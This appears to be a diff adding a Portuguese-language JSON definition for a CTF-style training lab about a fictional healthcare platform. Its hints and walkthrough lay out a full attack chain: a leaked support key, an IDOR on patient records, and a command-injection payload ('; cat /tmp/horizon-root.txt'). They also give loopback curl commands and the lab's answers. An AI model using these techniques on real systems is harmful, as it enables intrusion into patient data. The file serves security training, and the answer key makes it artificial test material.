@@ -1,0 +1,105 @@
+{
+  "slug": "realistic-horizon-health",
+  "title": "Horizon Health",
+  "codename": "HORIZON",
+  "summary": "Um engajamento de healthcare em caixa-preta: descubra um deployment bundle retido, use a API key de suporte para obter uma sessão, explore uma verificação de autorização ausente em registros de pacientes e chegue a uma ferramenta legada de admin para root.",
+  "category": "chain",
+  "difficulty": "hard",
+  "kind": "machine",
+  "lab_dir": "realistic-horizon-health",
+  "estimated_minutes": 60,
+  "xp": 440,
+  "tech": [
+    "Flask",
+    "Sessions",
+    "HTTP API",
+    "Shell",
+    "Recon"
+  ],
+  "tags": [
+    "machine",
+    "realistic",
+    "healthcare",
+    "idor",
+    "bfla",
+    "command-injection"
+  ],
+  "story": "A Horizon Health pediu uma avaliação em caixa-preta antes de um rollout regional. Nenhuma classe de vulnerabilidade foi fornecida. O site público é pequeno. O deployment de suporte e o portal de pacientes não têm links a partir da homepage. A própria política de robots da plataforma aponta para um path de backup. O resto fica com a sua metodologia.",
+  "objective": "Aborde o alvo em caixa-preta. Capture as flags API, user e root por meio de uma cadeia de descoberta, emissão de sessão, autorização de objetos e ferramentas administrativas. A flag de root é verificada por estado.",
+  "rules": "Todo o engajamento é a origem loopback atribuída. Não escaneie hosts externos. Trate os dados de pacientes como sintéticos; não tente modificar registros.",
+  "flags": [
+    {
+      "key": "api",
+      "label": "Flag da API de suporte",
+      "flag_type": "api",
+      "points": 120,
+      "required": true
+    },
+    {
+      "key": "user",
+      "label": "Flag do prontuário restrito do paciente",
+      "flag_type": "user",
+      "points": 100,
+      "required": true
+    },
+    {
+      "key": "root",
+      "label": "Flag root da ferramenta legada de admin",
+      "flag_type": "root",
+      "points": 220,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Recon antes da teoria",
+      "body": "Comece em `/robots.txt`. O path de backup de suporte desautorizado contém um JSON de deployment. Busque-o e procure a API key de suporte.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Emita uma sessão de suporte",
+      "body": "Chame `/api/internal/support/session` com `X-Support-Key: horizon-support-7d2f`. O JSON contém a flag de API e define um cookie de suporte. Mantenha o cookie jar.",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Siga o portal e as ferramentas legadas",
+      "body": "Com a sessão de suporte, GET `/portal/patients/3` para a flag de usuário. Depois envie um host de diagnóstico via POST para `/portal/admin/tools`; injete `; cat /tmp/horizon-root.txt` para ler a flag de root.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "**Etapa 1 — recon.** GET `/robots.txt`; ele desautoriza `/support/backup/`. Busque `/support/backup/deploy.json` e copie `support_api_key`.\n\n**Etapa 2 — sessão + flag de API.** Chame `/api/internal/support/session` com o header `X-Support-Key: horizon-support-7d2f`. Salve o cookie e leia `api_flag` no JSON. Envie-a.\n\n**Etapa 3 — flag de paciente.** GET `/portal`; o diretório lista os IDs de pacientes. Solicite `/portal/patients/3`; a sessão de suporte passa, mas nenhuma autorização de fila/objeto é aplicada. O prontuário restrito contém a flag de usuário.\n\n**Etapa 4 — root.** Abra `/portal/admin/tools` com o cookie de suporte e envie `127.0.0.1; cat /tmp/horizon-root.txt` como host. A saída da ferramenta contém a flag de root e registra o objetivo.\n\nExemplo:\n```bash\ncurl -c jar http://127.0.0.1:PORT/support/backup/deploy.json\ncurl -b jar -c jar -H 'X-Support-Key: horizon-support-7d2f' \\\n  http://127.0.0.1:PORT/api/internal/support/session\ncurl -b jar http://127.0.0.1:PORT/portal/patients/3\n```",
+    "root_cause": "Várias falhas de confiança independentes formam a cadeia: um segredo de deployment em um backup servido pela web; uma API interna de suporte que emite sessões de navegador a partir de uma chave estática; autorização de objeto de paciente ausente; e uma ferramenta legada de admin com command injection e privilégios excessivos.",
+    "mitigation": "Remova artefatos de deployment da raiz de documentos e rotacione chaves expostas; não deixe uma API de suporte emitir sessões de navegador; imponha autorização em todo objeto de paciente; separe roles de admin do escopo de suporte; substitua chamadas de shell por comandos seguros com argumentos fixos; restrinja a service account e registre o uso das ferramentas de admin."
+  },
+  "references": [
+    {
+      "title": "OWASP WSTG — Web Application Security Testing Methodology",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/latest/",
+      "source_type": "standard",
+      "description": "Metodologia de avaliação em caixa-preta."
+    },
+    {
+      "title": "OWASP API Security Top 10 2023 — A1: BOLA",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/",
+      "source_type": "standard",
+      "description": "Autorização do objeto de registro de paciente."
+    },
+    {
+      "title": "OWASP API Security Top 10 2023 — A5: BFLA",
+      "url": "https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/",
+      "source_type": "standard",
+      "description": "Acesso à ferramenta legada de admin a partir do escopo de suporte."
+    },
+    {
+      "title": "OWASP Command Injection Defenses",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Execução segura para a ferramenta de diagnóstico."
+    }
+  ]
+}
